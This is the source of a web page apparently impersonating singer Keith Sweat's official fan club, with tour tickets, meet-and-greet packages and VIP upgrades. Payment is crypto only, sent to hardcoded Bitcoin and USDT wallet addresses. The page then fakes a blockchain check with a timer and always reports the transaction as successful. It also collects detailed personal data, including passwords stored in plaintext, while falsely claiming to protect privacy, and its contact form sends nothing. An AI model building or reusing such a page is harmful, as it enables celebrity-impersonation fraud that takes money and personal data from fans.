<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keith Sweat | Official SWEAThearts Portal</title>
    
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,900;1,900&family=Inter:wght@300;400;700;900&display=swap');
        
        :root { --gold: #bf953f; --dark: #050505; }
        body { font-family: 'Inter', sans-serif; background: var(--dark); color: white; scroll-behavior: smooth; }
        
        .gold-text { background: linear-gradient(to right, #bf953f, #fcf6ba, #aa771c); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .gold-btn { background: linear-gradient(45deg, #bf953f, #fcf6ba, #aa771c); color: black; font-weight: 800; transition: 0.3s; cursor: pointer; }
        .glass { background: rgba(255,255,255,0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.08); }
        
        .hero-title { font-family: 'Playfair Display', serif; }
        .hidden-section { display: none !important; }
        
        .video-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 24px; border: 1px solid rgba(191,149,63,0.3); background: #000; }
        .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }

        input, select, textarea { background: rgba(255,255,255,0.05) !important; border: 1px solid rgba(255,255,255,0.1) !important; color: white !important; }
        option { background: #111; color: white; }
    </style>
</head>
<body>

    <!-- NAVIGATION -->
    <nav class="fixed w-full z-[100] px-6 py-5 flex justify-between items-center glass bg-black/80 border-b border-gold/10">
        <div class="text-xl font-black gold-text italic tracking-tighter cursor-pointer" onclick="window.scrollTo(0,0)">KEITH SWEAT</div>
        
        <div id="auth-nav" class="flex gap-6 items-center text-[10px] font-bold uppercase tracking-widest">
            <button onclick="openAuth('login')" class="hover:text-gold transition">Login</button>
            <button onclick="openAuth('signup')" class="gold-btn px-6 py-2 rounded-full text-black hover:scale-105 transition">Join SWEAThearts</button>
        </div>

        <div id="user-nav" class="hidden-section flex items-center gap-4">
            <div class="text-right hidden md:block">
                <p id="nav-user-name" class="font-bold text-sm"></p>
                <p class="text-[9px] gold-text uppercase font-black">Platinum Member</p>
            </div>
            <img id="nav-avatar" src="" class="w-10 h-10 rounded-full border border-gold/50 object-cover">
            <button onclick="handleLogout()" class="p-2 hover:text-red-500 transition"><i data-lucide="log-out" class="w-5 h-5"></i></button>
        </div>
    </nav>

    <!-- LANDING PAGE -->
    <div id="landing-page-container">
        <!-- HERO -->
        <section class="relative h-screen flex flex-col justify-center items-center text-center px-6 overflow-hidden">
            <div class="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?q=80&w=2070')] bg-cover bg-center opacity-40 scale-110 blur-[2px]"></div>
            <div class="absolute inset-0 bg-gradient-to-t from-dark via-transparent to-dark"></div>
            
            <div class="z-10 animate-fade-in">
                <h1 class="hero-title text-6xl md:text-[10rem] font-black gold-text mb-4 italic leading-none drop-shadow-2xl">NOBODY</h1>
                <p class="text-lg md:text-xl text-gray-300 max-w-2xl mx-auto mb-12 tracking-[0.4em] uppercase font-light">Official 2026 World Tour Experience</p>
                
                <div class="flex flex-col md:flex-row gap-4 justify-center">
                    <button onclick="openAuth('login')" class="gold-btn px-16 py-5 rounded-full uppercase text-xs tracking-[0.3em] hover:scale-110 transition shadow-[0_0_50px_rgba(191,149,63,0.3)]">Enter The Vault</button>
                    <a href="#legacy" class="px-16 py-5 border border-white/20 rounded-full font-bold uppercase text-xs tracking-widest hover:bg-white/5 transition flex items-center justify-center">The Legacy</a>
                </div>
            </div>
        </section>

        <!-- MEMBERSHIP BLURB -->
        <section class="py-24 px-6 max-w-4xl mx-auto text-center border-y border-white/5">
            <h2 class="gold-text text-3xl font-black uppercase mb-8 italic tracking-widest">The "SWEAThearts" Club</h2>
            <p class="text-gray-400 leading-loose text-lg font-light italic">
                As a member of the <span class="text-white font-bold">“SWEAThearts”</span>, your memberships offers you the chance to gain access to a treasure trove of exclusive content, including behind-the-scenes footage, unreleased tracks, and intimate interviews with the man himself. Immerse yourself in the creative process, gain insight into Sweat's inspirations, and be the first to hear his latest music before it hits the airwaves.
            </p>
        </section>

        <!-- SWEAT FEST & NEWS -->
        <section class="py-24 px-6 max-w-7xl mx-auto grid lg:grid-cols-2 gap-12 items-center">
            <div class="glass p-12 rounded-[40px] border-gold/20">
                <div class="bg-gold/10 text-gold inline-block px-4 py-1 rounded-full text-[10px] font-black uppercase mb-6 tracking-widest">Major Event</div>
                <h2 class="text-5xl font-black gold-text italic mb-6">SWEAT FEST 2026</h2>
                <p class="text-gray-400 mb-8 leading-relaxed">Prepare for the ultimate R&B getaway. Sweat Fest brings together the legends of soul for a multi-day beach experience. Exclusive early bird packages available for members only.</p>
                <div class="flex items-center gap-4 text-xs font-bold">
                    <span class="flex items-center gap-2"><i data-lucide="map-pin" class="w-4 h-4 text-gold"></i> Montego Bay, JA</span>
                    <span class="flex items-center gap-2"><i data-lucide="calendar" class="w-4 h-4 text-gold"></i> June 12-15</span>
                </div>
            </div>
            <div class="space-y-6">
                <h3 class="text-xs gold-text font-black uppercase tracking-[0.5em] mb-4">Latest Headlines</h3>
                <div class="glass p-6 rounded-2xl flex gap-6 items-start">
                    <div class="bg-gold text-black p-3 rounded-lg font-black text-center min-w-[60px]">20<br><span class="text-[10px]">JAN</span></div>
                    <div>
                        <h4 class="font-bold uppercase tracking-widest text-sm mb-1 italic">World Tour 2026 officially announced</h4>
                        <p class="text-xs text-gray-500">Keith Sweat kicks off the "No One Like Me" tour across 35 cities starting in Miami.</p>
                    </div>
                </div>
                <div class="glass p-6 rounded-2xl flex gap-6 items-start opacity-70">
                    <div class="bg-white/10 text-white p-3 rounded-lg font-black text-center min-w-[60px]">15<br><span class="text-[10px]">JAN</span></div>
                    <div>
                        <h4 class="font-bold uppercase tracking-widest text-sm mb-1 italic">New Single "Working 2" featuring Lil Wayne</h4>
                        <p class="text-xs text-gray-500">The legendary crooner returns with a fresh hit currently climbing the charts.</p>
                    </div>
                </div>
            </div>
        </section>

        <!-- LEGACY SECTION -->
        <section id="legacy" class="py-32 px-6 bg-gradient-to-b from-black to-zinc-900 border-t border-gold/10">
            <div class="max-w-4xl mx-auto space-y-12">
                <div class="text-center">
                    <h2 class="hero-title text-6xl gold-text italic mb-4">The Legacy</h2>
                    <p class="text-xs tracking-[0.4em] uppercase text-gray-500">6x Platinum Producer, Singer & Songwriter</p>
                </div>
                <div class="space-y-8 text-gray-400 leading-loose text-justify text-lg font-light first-letter:text-7xl first-letter:font-black first-letter:text-gold first-letter:mr-3 first-letter:float-left">
                    Keith Sweat. Who does it better than him... <span class="text-white font-black italic">NOBODY!!!!!</span> Born in Harlem, New York, Keith Sweat began his musical journey in the late 70s, but it was his 1987 debut solo album, <span class="text-white">Make It Last Forever</span>, that revolutionized the R&B world, selling over four million copies.
                </div>
                <div class="space-y-8 text-gray-400 leading-loose text-justify text-lg font-light">
                    As a pioneer of the "New Jack Swing" movement, his smooth baritone and signature "begging" style became the blueprint for modern R&B. From his stint with the supergroup LSG to his continued dominance as a producer and radio host of "The Sweat Hotel," Keith remains the undisputed king of slow jams.
                </div>
            </div>
        </section>

        <!-- UPCOMING EVENTS LIST -->
        <section class="py-24 px-6 max-w-7xl mx-auto">
            <h3 class="text-4xl font-black uppercase gold-text italic mb-12 text-center">Upcoming Events 2026</h3>
            <div id="landing-events" class="grid lg:grid-cols-2 gap-4"></div>
        </section>

        <!-- CONTACT SECTION -->
        <section class="py-24 px-6 max-w-3xl mx-auto border-t border-white/5">
            <div class="text-center mb-12">
                <h2 class="text-3xl font-black uppercase gold-text italic mb-2">Get In Touch</h2>
                <p class="text-[10px] text-gray-500 uppercase tracking-widest">Professional inquiries & Fan Support</p>
            </div>
            <div class="glass p-10 rounded-[30px] space-y-4">
                <input type="email" id="contact-email" placeholder="Your Email Address" class="w-full p-5 rounded-2xl outline-none">
                <textarea id="contact-msg" rows="4" placeholder="How can we help you?" class="w-full p-5 rounded-2xl outline-none resize-none"></textarea>
                <button onclick="toast('✓ MESSAGE SENT TO MANAGEMENT')" class="gold-btn w-full py-5 rounded-2xl uppercase tracking-[0.2em] font-black">Send Message</button>
            </div>
        </section>

        <!-- FOOTER & NEWSLETTER -->
        <footer class="py-24 px-6 bg-black text-center border-t border-white/5">
            <h3 class="hero-title text-4xl mb-4 italic">Who can ♥ you like me?</h3>
            <p class="gold-text text-5xl font-black italic mb-12">Nobooody!</p>
            <p class="text-gray-500 text-xs uppercase tracking-widest mb-8">Stay in touch and subscribe to the newsletter</p>
            
            <div class="max-w-md mx-auto flex gap-2 mb-8">
                <input type="email" id="newsletter-email" placeholder="Email Address" class="flex-1 p-4 rounded-xl outline-none">
                <button onclick="handleSubscribe()" class="gold-btn px-8 rounded-xl font-black uppercase text-[10px]">Subscribe</button>
            </div>
            <p class="text-[9px] text-gray-600 uppercase mb-4">We respect your privacy, so we never share your information.</p>
            <div class="text-[10px] text-gray-500 font-bold tracking-[0.4em] uppercase">© 2026 KEITH SWEAT ENT.</div>
        </footer>
    </div>

    <!-- DASHBOARD -->
    <div id="dashboard" class="hidden-section pt-32 px-6 max-w-7xl mx-auto pb-20">
        <div class="grid lg:grid-cols-12 gap-10">
            <div class="lg:col-span-8 space-y-10">
                <div class="flex items-center gap-4">
                    <h2 class="text-3xl font-black uppercase tracking-tight">SWEATheart Vault / <span id="welcome-name" class="gold-text"></span></h2>
                </div>
                
                <div class="video-container shadow-[0_0_100px_rgba(191,149,63,0.1)]">
                    <iframe
                        id="vault-video"
                        frameborder="0"
                        allow="autoplay; encrypted-media"
                        allowfullscreen>
                    </iframe>
                </div>

                <div class="space-y-6">
                    <h3 class="text-xs font-black gold-text uppercase tracking-[0.4em]">Active Itinerary</h3>
                    <div id="ticket-container" class="grid md:grid-cols-2 gap-4"></div>
                </div>
            </div>

            <div class="lg:col-span-4 space-y-6">
                <div class="glass p-8 rounded-[35px] border-gold/30 relative overflow-hidden group">
                    <div class="flex justify-between items-start mb-12">
                        <div class="bg-gold text-black text-[8px] font-black px-3 py-1 rounded-full uppercase">Platinum Member</div>
                        <i data-lucide="crown" class="text-gold w-6 h-6"></i>
                    </div>
                    <div class="flex gap-5 items-center">
                        <div class="relative cursor-pointer" onclick="document.getElementById('avatar-upload').click()">
                            <img id="card-avatar" src="" class="w-20 h-20 rounded-2xl object-cover border border-white/10">
                            <input type="file" id="avatar-upload" class="hidden" accept="image/*" onchange="previewImage(this)">
                        </div>
                        <div>
                            <p id="card-name" class="font-black text-lg uppercase gold-text leading-tight"></p>
                            <p id="card-origin" class="text-[9px] text-gray-400 font-bold uppercase tracking-widest"></p>
                        </div>
                    </div>
                </div>

                <button onclick="showDetails('Exclusive Meet & Greet', 750, 'VIP', 'Backstage Access', 'Includes a 15-minute private meeting, high-quality professional selfies, exclusive fan gifts, and signed memorabilia.')" class="gold-btn w-full py-8 rounded-[30px] text-sm uppercase tracking-[0.2em] shadow-2xl hover:scale-105 transition">
                    Request Meet & Greet
                </button>

                <div class="glass p-8 rounded-[35px] space-y-5">
                    <h4 class="text-[10px] font-black uppercase text-gray-500 tracking-widest">Upgrade Status</h4>
                    <div id="tier-container" class="space-y-4"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- PAYMENT MODAL -->
    <div id="universal-modal" class="hidden-section fixed inset-0 z-[500] flex items-center justify-center bg-black/98 p-4 overflow-y-auto">
        <div class="glass max-w-md w-full p-10 rounded-[45px] relative border-gold/20 my-auto">
            <button onclick="closeModals()" class="absolute top-8 right-8 text-gray-500 hover:text-white"><i data-lucide="x"></i></button>
            
            <div id="stage-details" class="space-y-8 text-center">
                <h4 id="det-title" class="text-2xl font-black gold-text uppercase italic"></h4>
                <div class="space-y-2">
                    <p id="det-venue" class="text-[10px] text-gray-400 font-bold uppercase tracking-[0.3em]"></p>
                    <p id="det-desc" class="text-[11px] text-gray-500 italic px-4"></p>
                </div>
                <div class="flex items-center justify-center gap-10 py-4">
                    <button onclick="updateQty(-1)" class="w-12 h-12 rounded-full border border-white/10 hover:border-gold transition text-2xl">-</button>
                    <span id="qty-display" class="text-5xl font-black">1</span>
                    <button onclick="updateQty(1)" class="w-12 h-12 rounded-full border border-white/10 hover:border-gold transition text-2xl">+</button>
                </div>
                <div class="border-t border-white/5 pt-6">
                    <p id="total-price-display" class="text-5xl font-black gold-text">$0</p>
                    <p id="vip-perks" class="hidden-section text-[9px] gold-text mt-4 uppercase tracking-widest">Includes Private Meeting • Professional Selfies • Signed Gifts</p>
                </div>
                <button onclick="showStage('wallets')" class="gold-btn w-full py-6 rounded-2xl uppercase tracking-widest text-xs">Proceed to Payment</button>
            </div>

            <div id="stage-wallets" class="hidden-section space-y-4">
                <p class="text-center text-[10px] text-gray-500 uppercase tracking-widest mb-4">Select Crypto Method</p>
                <button onclick="showFinalWallet('BTC', 'bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7')" class="w-full p-6 glass rounded-2xl flex justify-between items-center hover:border-gold transition">
                    <span class="font-bold">BITCOIN</span>
                    <i data-lucide="badge-dollar-sign" class="text-gold"></i>
                </button>
                <button onclick="showFinalWallet('USDT', '0x08cfe6ddc3b58b0655dd1c9214bcfddbd3855cca')" class="w-full p-6 glass rounded-2xl flex justify-between items-center hover:border-gold transition">
                    <span class="font-bold">USDT (ERC20)</span>
                    <i data-lucide="shield-check" class="text-gold"></i>
                </button>
            </div>

            <div id="stage-address" class="hidden-section text-center space-y-8">
                <div class="bg-white p-3 rounded-2xl w-48 h-48 mx-auto shadow-2xl">
                    <img id="qr-img" src="" class="w-full">
                </div>
                <div class="space-y-4">
                    <p class="text-[10px] text-gray-500 uppercase tracking-widest">Send Payment to Address</p>
                    <div class="flex items-center gap-3 bg-white/5 p-5 rounded-2xl border border-gold/30">
                        <p id="wallet-addr" class="text-lg font-mono break-all font-black text-white"></p>
                        <button onclick="copyAddr()" class="p-2 bg-gold/20 rounded-lg text-gold hover:bg-gold hover:text-black transition">
                            <i data-lucide="copy" class="w-6 h-6"></i>
                        </button>
                    </div>
                </div>
                <button onclick="processFinal()" class="gold-btn w-full py-6 rounded-xl font-black uppercase text-xs">Verify Payment Status</button>
            </div>

            <div id="stage-loading" class="hidden-section py-20 text-center">
                <div class="w-16 h-16 border-4 border-gold border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
                <p class="font-black tracking-widest gold-text">SEARCHING MEMPOOL...</p>
            </div>

            <div id="stage-thankyou" class="hidden-section py-10 text-center space-y-6">
                <div class="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mx-auto"><i data-lucide="check" class="text-green-500 w-10 h-10"></i></div>
                <h2 class="text-3xl font-black gold-text uppercase">SUCCESSFUL</h2>
                <p class="text-xs text-gray-400">Transaction confirmed. Access tokens sent to your email.</p>
                <button onclick="closeModals()" class="gold-btn px-10 py-4 rounded-xl text-xs uppercase">Done</button>
            </div>
        </div>
    </div>

    <!-- AUTH/SIGNUP MODAL -->
    <div id="auth-modal" class="hidden-section fixed inset-0 z-[200] flex items-center justify-center bg-black/95 p-4 overflow-y-auto">
        <div class="glass max-w-lg w-full p-10 rounded-[40px] relative border-gold/20 my-auto">
            <button onclick="closeModals()" class="absolute top-8 right-8 text-gray-500"><i data-lucide="x"></i></button>
            
            <div id="signup-box" class="space-y-4">
                <h2 class="text-3xl font-black gold-text mb-2 text-center uppercase italic">Join SWEAThearts</h2>
                <p class="text-center text-[10px] text-gray-500 mb-6 tracking-widest">COMPLETE YOUR OFFICIAL FAN PROFILE</p>
                
                <div class="grid md:grid-cols-2 gap-4">
                    <input type="text" id="reg-name" placeholder="Full Name" class="p-4 rounded-xl outline-none">
                    <input type="email" id="reg-email" placeholder="Email" class="p-4 rounded-xl outline-none">
                </div>
                <div class="grid md:grid-cols-2 gap-4">
                    <input type="password" id="reg-pass" placeholder="Password" class="p-4 rounded-xl outline-none">
                    <input type="number" id="reg-age" placeholder="Age" class="p-4 rounded-xl outline-none">
                </div>
                <div class="grid md:grid-cols-2 gap-4">
                    <select id="reg-sex" class="p-4 rounded-xl outline-none">
                        <option value="">Sex</option><option>Male</option><option>Female</option><option>Other</option>
                    </select>
                    <select id="reg-country" onchange="updateCountryCode()" class="p-4 rounded-xl outline-none">
                        <option value="">Country</option>
                        <option value="US" data-code="+1">United States</option>
                        <option value="UK" data-code="+44">United Kingdom</option>
                        <option value="CA" data-code="+1">Canada</option>
                        <option value="NG" data-code="+234">Nigeria</option>
                        <option value="ZA" data-code="+27">South Africa</option>
                        <option value="GH" data-code="+233">Ghana</option>
                        <option value="JA" data-code="+1-876">Jamaica</option>
                        <option value="BR" data-code="+55">Brazil</option>
                        <option value="AU" data-code="+61">Australia</option>
                        <option value="FR" data-code="+33">France</option>
                        <option value="DE" data-code="+49">Germany</option>
                        <option value="AE" data-code="+971">UAE</option>
                    </select>
                </div>
                <div class="grid md:grid-cols-2 gap-4">
                    <input type="text" id="reg-state" placeholder="State/Region" class="p-4 rounded-xl outline-none">
                    <input type="text" id="reg-city" placeholder="City" class="p-4 rounded-xl outline-none">
                </div>
                <div class="flex gap-2">
                    <input type="text" id="reg-code" readonly class="w-20 p-4 rounded-xl text-center bg-gold/10 text-gold font-bold">
                    <input type="tel" id="reg-phone" placeholder="Phone Number" class="flex-1 p-4 rounded-xl outline-none">
                </div>
                
                <button id="signup-btn" onclick="handleSignupFlow()" class="gold-btn w-full py-5 rounded-2xl uppercase text-xs mt-4">Create Membership</button>
            </div>

            <div id="verify-box" class="hidden-section space-y-6 text-center">
                <h2 class="text-3xl font-black gold-text mb-4 uppercase italic">Verify Identity</h2>
                <p class="text-[10px] text-gray-500 mb-8 uppercase tracking-[0.2em]">Enter the 6-digit code sent to your email</p>
                <div class="flex justify-center">
                    <input type="text" maxlength="6" id="verify-code-input" placeholder="000000" class="w-full bg-transparent border-b-2 border-gold text-center text-5xl font-black py-4 outline-none tracking-[0.5em] gold-text placeholder:text-gold/20">
                </div>
                <button onclick="completeVerification()" class="gold-btn w-full py-5 rounded-2xl uppercase text-xs mt-8">Verify Account</button>
            </div>

            <div id="login-box" class="hidden-section space-y-4">
                <h2 class="text-3xl font-black gold-text mb-8 text-center uppercase italic">Member Access</h2>
                <input type="email" id="log-email" placeholder="Email" class="w-full p-4 rounded-xl outline-none">
                <input type="password" id="log-pass" placeholder="Password" class="w-full p-4 rounded-xl outline-none">
                <button onclick="handleLogin()" class="gold-btn w-full py-5 rounded-2xl uppercase text-xs mt-4">Verify Identity</button>
            </div>
        </div>
    </div>

    <script>
        emailjs.init("KNFIOQmX4KE0zkQWi");
        const firebaseConfig = { apiKey: "AIzaSyBb0YUZbhvhYfF9WraXy-CS5HtM9nkqG60", authDomain: "sol-ruca.firebaseapp.com", projectId: "sol-ruca", storageBucket: "sol-ruca.firebasestorage.app", messagingSenderId: "51567930077", appId: "1:51567930077:web:8f345e5857b67efa1a0934" };
        firebase.initializeApp(firebaseConfig);
        const db_fs = firebase.firestore();

        lucide.createIcons();
        let cur = {};
        let currentUser = null;
        let tempUser = null;

        const tourEvents = [
            { date: "JAN 24", d: "SAT", v: "MAGIC CITY CASINO", city: "MIAMI, FL", time: "8:00 pm", addr: "450 NW 37th Ave, Miami, FL 33125", price: 150, info: "Floor seating, premium sound acoustics, and exclusive merchandise booth access." },
            { date: "JAN 31", d: "SAT", v: "MYSTIC LAKE CASINO", city: "PRIOR LAKE, MN", time: "8:30 pm", addr: "2400 Mystic Lk Blvd, Prior Lake, MN 55372", price: 90, info: "Luxury theater experience with intimate stage proximity and valet parking." },
            { date: "FEB 06", d: "FRI", v: "POWERS AUDITORIUM", city: "YOUNGSTOWN, OH", time: "8:00 pm", addr: "260 W Federal St, Youngstown, OH 44503", price: 85, info: "Historic venue setting with specialized acoustics for an unplugged experience." },
            { date: "FEB 07", d: "SAT", v: "HORSESHOE HAMMOND", city: "HAMMOND, IN", time: "8:30 pm", addr: "777 Casino Center Dr, Hammond, IN 46320", price: 110, info: "High-energy casino venue with specialized VIP lounges and after-party access." },
            { date: "FEB 13", d: "FRI", v: "SCOPE ARENA", city: "NORFOLK, VA", time: "8:00 pm", addr: "201 E Brambleton Ave, Norfolk, VA 23510", price: 125, info: "Large scale arena production with massive visual screens and full band setup." },
            { date: "FEB 14", d: "SAT", v: "BOARDWALK HALL", city: "ATLANTIC CITY, NJ", time: "8:30 pm", addr: "2301 Boardwalk, Atlantic City, NJ 08401", price: 140, info: "Valentine's Day Special. Includes commemorative photo op and rose for couples." },
            { date: "FEB 15", d: "SUN", v: "TOTAL MORTGAGE ARENA", city: "BRIDGEPORT, CT", time: "8:30 pm", addr: "600 Main St, Bridgeport, CT 06604", price: 105, info: "Premium stadium views with high-definition replay screens and lounge dining." },
            { date: "FEB 21", d: "SAT", v: "BJCC ARENA", city: "BIRMINGHAM, AL", time: "8:00 pm", addr: "1898 9th Ave N, Birmingham, AL 35203", price: 130, info: "Grand finale tour date. Extended setlist and special guest appearances." }
        ];

        function toast(txt) { 
            Toastify({ text: txt, duration: 4000, position: "center", style: { background: "#000", color: "#bf953f", border: "1px solid #bf953f", borderRadius: "12px", fontSize: "10px", fontWeight: "900" } }).showToast(); 
        }

        function updateCountryCode() {
            const sel = document.getElementById('reg-country');
            const code = sel.options[sel.selectedIndex].getAttribute('data-code');
            document.getElementById('reg-code').value = code || "";
        }

        function handleSubscribe() {
            const email = document.getElementById('newsletter-email').value;
            if(email) {
                document.getElementById('newsletter-email').value = "";
                toast("✓ WELCOME TO THE NEWSLETTER");
            }
        }

        function openAuth(m) {
            document.getElementById('auth-modal').classList.remove('hidden-section');
            document.getElementById('signup-box').classList.toggle('hidden-section', m !== 'signup');
            document.getElementById('login-box').classList.toggle('hidden-section', m !== 'login');
            document.getElementById('verify-box').classList.add('hidden-section');
        }

        function closeModals() { 
            document.getElementById('auth-modal').classList.add('hidden-section'); 
            document.getElementById('universal-modal').classList.add('hidden-section'); 
        }

        async function handleSignupFlow() {
            const user = {
                name: document.getElementById('reg-name').value,
                email: document.getElementById('reg-email').value,
                pass: document.getElementById('reg-pass').value,
                age: document.getElementById('reg-age').value,
                country: document.getElementById('reg-country').value,
                city: document.getElementById('reg-city').value
            };
            if(!user.name || !user.email || !user.pass) return toast("✕ ALL FIELDS REQUIRED");
            const otp = Math.floor(100000 + Math.random() * 900000).toString();
            tempUser = user;
            try {
                await db_fs.collection("verificationCodes").doc(user.email).set({ code: otp });
                await emailjs.send('service_ygmydfe', 'template_zn0fykw', { email: user.email, passcode: otp });
                document.getElementById('signup-box').classList.add('hidden-section');
                document.getElementById('verify-box').classList.remove('hidden-section');
                toast("✓ VERIFICATION CODE DISPATCHED");
            } catch (e) { toast("✕ EMAIL ERROR"); }
        }

        async function completeVerification() {
            const userCode = document.getElementById('verify-code-input').value;
            if (userCode) {
                const doc = await db_fs.collection("verificationCodes").doc(tempUser.email).get();
                if (doc.exists && doc.data().code === userCode) {
                    let db = JSON.parse(localStorage.getItem('ks_hearts')) || [];
                    db.push(tempUser);
                    localStorage.setItem('ks_hearts', JSON.stringify(db));
                    toast("✓ VERIFIED! PLEASE LOGIN.");
                    document.getElementById('verify-box').classList.add('hidden-section');
                    document.getElementById('login-box').classList.remove('hidden-section');
                    document.getElementById('log-email').value = tempUser.email;
                } else { toast("✕ INVALID CODE"); }
            }
        }

        function handleLogin() {
            const email = document.getElementById('log-email').value;
            const pass = document.getElementById('log-pass').value;
            const db = JSON.parse(localStorage.getItem('ks_hearts')) || [];
            const u = db.find(x => x.email === email && x.pass === pass);
            if(u) {
                currentUser = u;
                document.getElementById('landing-page-container').classList.add('hidden-section');
                document.getElementById('dashboard').classList.remove('hidden-section');
                document.getElementById('auth-nav').classList.add('hidden-section');
                document.getElementById('user-nav').classList.remove('hidden-section');
                document.getElementById('nav-user-name').innerText = u.name;
                document.getElementById('welcome-name').innerText = u.name.toUpperCase();
                document.getElementById('card-name').innerText = u.name;
                document.getElementById('card-origin').innerText = `${u.city || 'Harlem'}, ${u.country || 'USA'}`;
                document.getElementById('nav-avatar').src = `https://ui-avatars.com/api/?name=${u.name}&background=bf953f&color=000`;
                document.getElementById('card-avatar').src = `https://ui-avatars.com/api/?name=${u.name}&background=bf953f&color=000`;
                
                // NEW: Set iframe source on login
                document.getElementById('vault-video').src = "https://www.youtube.com/embed/eD-HNycVXK0";
                
                populateDashboardTickets();
                closeModals();
                window.scrollTo(0,0);
            } else { toast("✕ UNKNOWN ACCOUNT"); }
        }

        function handleLogout() {
            currentUser = null;
            document.getElementById('landing-page-container').classList.remove('hidden-section');
            document.getElementById('dashboard').classList.add('hidden-section');
            document.getElementById('auth-nav').classList.remove('hidden-section');
            document.getElementById('user-nav').classList.add('hidden-section');
            
            // Clear video src on logout
            document.getElementById('vault-video').src = "";
            
            toast("✓ LOGGED OUT");
        }

        function populateLandingEvents() {
            const cont = document.getElementById('landing-events');
            cont.innerHTML = tourEvents.map(e => `
                <div class="glass p-6 rounded-3xl flex items-center justify-between border-white/5">
                    <div class="flex gap-6 items-center">
                        <div class="text-center bg-gold/10 text-gold p-3 rounded-2xl min-w-[70px]">
                            <p class="text-[9px] font-black">${e.d}</p>
                            <p class="text-lg font-black leading-none">${e.date.split(' ')[1]}</p>
                            <p class="text-[9px] font-black">${e.date.split(' ')[0]}</p>
                        </div>
                        <div>
                            <h4 class="font-black gold-text uppercase text-sm">${e.v}</h4>
                            <p class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">${e.city}</p>
                        </div>
                    </div>
                    <button onclick="openAuth('login')" class="text-[10px] border border-gold px-6 py-2 rounded-full uppercase font-black hover:bg-gold hover:text-black transition">Tickets</button>
                </div>
            `).join('');
        }

        function populateDashboardTickets() {
            document.getElementById('ticket-container').innerHTML = tourEvents.map(m => `
                <div class="glass p-6 rounded-3xl flex justify-between items-center border-white/5 hover:border-gold/30 transition group cursor-pointer" onclick="showDetails('${m.v}', ${m.price}, 'Ticket', '${m.addr} | ${m.time}', '${m.info}')">
                    <div>
                        <p class="text-[9px] gold-text font-black uppercase mb-1">${m.date}</p>
                        <h4 class="font-bold text-xs uppercase tracking-widest group-hover:text-gold transition">${m.v}</h4>
                        <p class="text-[8px] text-gray-500 uppercase">${m.city}</p>
                    </div>
                    <div class="flex flex-col items-end">
                        <span class="text-[10px] font-black mb-2">$${m.price}</span>
                        <i data-lucide="chevron-right" class="w-4 h-4 text-gold"></i>
                    </div>
                </div>`).join('');

            document.getElementById('tier-container').innerHTML = [
                {n: "Gold Circle", p: 250, d: "Front row seating + backstage pass"}, 
                {n: "Diamond VIP", p: 950, d: "Full hospitality + personal meeting"}
            ].map(t => `
                <div class="p-4 rounded-2xl bg-white/5 flex gap-4 items-center border border-white/5 hover:border-gold/20 transition group">
                    <i data-lucide="contact-2" class="w-8 h-8 text-gold opacity-50 group-hover:opacity-100 transition"></i>
                    <div class="flex-1">
                        <b class="text-[10px] gold-text uppercase">${t.n}</b>
                        <p class="text-[9px] text-gray-500 line-clamp-1">${t.d}</p>
                    </div>
                    <button onclick="showDetails('${t.n}', ${t.p}, 'Tier', '${t.d}', 'Exclusive upgrade for top tier SWEAThearts. Includes professional photos and limited edition merch.')" class="text-[9px] border border-gold text-gold px-3 py-1.5 rounded-full uppercase hover:bg-gold hover:text-black transition">Upgrade</button>
                </div>`).join('');
            lucide.createIcons();
        }

        function showDetails(title, price, type, venue, info) {
            cur = { title, price, qty: 1, type, venue, info };
            document.getElementById('universal-modal').classList.remove('hidden-section');
            showStage('details');
            document.getElementById('det-title').innerText = title;
            document.getElementById('det-venue').innerText = venue;
            document.getElementById('det-desc').innerText = info;
            
            const perks = document.getElementById('vip-perks');
            if(title.toLowerCase().includes('meet') || title.toLowerCase().includes('diamond')) {
                perks.classList.remove('hidden-section');
            } else {
                perks.classList.add('hidden-section');
            }

            updateQty(0);
        }

        function updateQty(v) {
            cur.qty = Math.max(1, cur.qty + v);
            document.getElementById('qty-display').innerText = cur.qty;
            document.getElementById('total-price-display').innerText = `$${cur.qty * cur.price}`;
        }

        function showStage(s) {
            ['details', 'wallets', 'address', 'loading', 'thankyou'].forEach(id => {
                document.getElementById('stage-'+id).classList.add('hidden-section');
            });
            document.getElementById('stage-'+s).classList.remove('hidden-section');
        }

        function showFinalWallet(m, a) {
            showStage('address');
            document.getElementById('wallet-addr').innerText = a;
            document.getElementById('qr-img').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${a}`;
            lucide.createIcons();
        }

        function copyAddr() {
            const addr = document.getElementById('wallet-addr').innerText;
            const el = document.createElement('textarea');
            el.value = addr;
            document.body.appendChild(el); el.select();
            document.execCommand('copy'); document.body.removeChild(el);
            toast("✓ ADDRESS COPIED");
        }

        function processFinal() { 
            showStage('loading'); 
            setTimeout(() => { showStage('thankyou'); lucide.createIcons(); }, 4000); 
        }

        function previewImage(input) {
            if (input.files && input.files[0]) {
                const reader = new FileReader();
                reader.onload = e => {
                    document.getElementById('card-avatar').src = e.target.result;
                    document.getElementById('nav-avatar').src = e.target.result;
                    toast("✓ PHOTO UPDATED");
                };
                reader.readAsDataURL(input.files[0]);
            }
        }

        window.onload = () => { populateLandingEvents(); };
